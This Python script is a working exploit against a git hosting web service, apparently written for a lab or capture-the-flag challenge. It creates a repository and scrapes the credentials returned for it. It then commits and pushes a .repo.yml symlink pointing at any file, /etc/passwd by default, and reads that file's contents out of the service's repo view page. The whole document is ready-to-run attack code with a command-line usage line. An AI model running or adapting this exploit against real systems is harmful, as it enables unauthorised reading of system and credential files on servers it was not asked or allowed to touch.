import sys
import os
import subprocess
import requests
from bs4 import BeautifulSoup

BACKEND = os.environ["SERVICE_APP_HTTP_HOST"] + ":" + os.environ["SERVICE_APP_HTTP_PORT"]


def push_symlink_repo_yml(target, repo_name, password):

    # Change to the specified directory
    original_dir = os.getcwd()
    if not os.path.exists("repos/"):
        os.makedirs("repos/")
    os.chdir("repos/")

    # Clone the repository
    encoded_password = requests.utils.quote(password)

    giturl = f"http://{repo_name}:{encoded_password}@{BACKEND}/git/{repo_name}"
    print(f"Cloning {giturl}")
    result = subprocess.run(
        ["git", "clone", giturl, repo_name],
        check=True
    )

    if result.returncode == 0:
        os.chdir(repo_name)
    else:
        raise RuntimeError("Git clone failed, cannot change directory.")

    try:
        # Step 1: Remove existing .repo.yml and create new empty one
        if os.path.exists(".repo.yml"):
            os.remove(".repo.yml")
        open(".repo.yml", "w").close()
        subprocess.run(["git", "add", "."])
        subprocess.run(["git", "commit", "-m", "reset repo.yml"])

        # Step 2: Replace with symlink to target
        if os.path.exists(".repo.yml"):
            os.remove(".repo.yml")
        subprocess.run(["ln", "-s", target, ".repo.yml"])
        subprocess.run(["git", "add", "."])
        subprocess.run(["git", "commit", "-m", f"AAAAAAAAAA"])
        subprocess.run(["git", "push", f"http://{repo_name}:{encoded_password}@{BACKEND}/git/{repo_name}"], check=True)    
    finally:
        # Return to the original directory
        os.chdir(original_dir)


def make_repo():
    # Create a new repository by sending a POST request
    url = f"http://{BACKEND}/repos"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"template": "basic"}
    response = requests.post(url, headers=headers, data=data)

    return response.text


def get_file(leak_file="/etc/passwd"):
    r = make_repo()

    # Parse the repository name and location from the response using string split
    repo_name = r.split("Username: <code>")[1].split("</code>")[0].strip()
    password = r.split("Password: <code>")[1].split("</code>")[0].strip()

    try:
        push_symlink_repo_yml(leak_file, repo_name, password)
    except Exception as e:
        print(f"Retrying due to error: {e}")
        try:
            os.rmdir(repo_name)
        except Exception as e:
            pass
        return get_file(leak_file)

    try:
        os.rmdir(repo_name)
    except Exception as e:
        print(f"Error removing directory: {e}")

    # Get file
    repourl = f"http://{BACKEND}/repos/{repo_name}"
    print(repourl)
    r = requests.get(repourl)
    print(r.text)
    # Extract and return data between 'data': and </pre> using string methods
    start_index = r.text.find("AAAAAAAAAA', 'data': '") + len("AAAAAAAAAA', 'data': '")
    end_index = r.text.find("</pre>", start_index)

    
    if start_index != -1 and end_index != -1:
        extracted_data = r.text[start_index:end_index - 2].strip()
        # Clean up the extracted data
        return extracted_data
    else:
        return "Could not find the specified data."

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python leak_file.py <file_to_leak>")
        sys.exit(1)

    file_to_leak = sys.argv[1]
    leaked_data = get_file(file_to_leak)
    print(leaked_data)